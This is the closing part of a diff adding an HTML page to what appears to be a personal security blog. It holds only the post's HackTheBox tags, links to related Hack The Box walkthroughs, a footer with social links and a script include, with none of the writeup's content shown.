+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/hackthebox/" class="tag">HackTheBox</a>
+      <a href="/tag/writeup/" class="tag">Writeup</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
+        <a href="https://www.youtube.com/@sheerazali" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://twitter.com/BeingSheerazAli" target="_blank" title="Twitter/X"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/pwnmeow" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      </div>
+      <div class="footer-copy">
+        <span class="cmd-prompt">$</span>
+        <span class="cmd-text">echo</span>
+        <span class="cmd-string">"&copy; 2026 Sheeraz Ali. All rights reserved."</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<script src="/assets/js/main.js?v=96ad5fd1fb"></script>
+
+
+</body>
+</html>
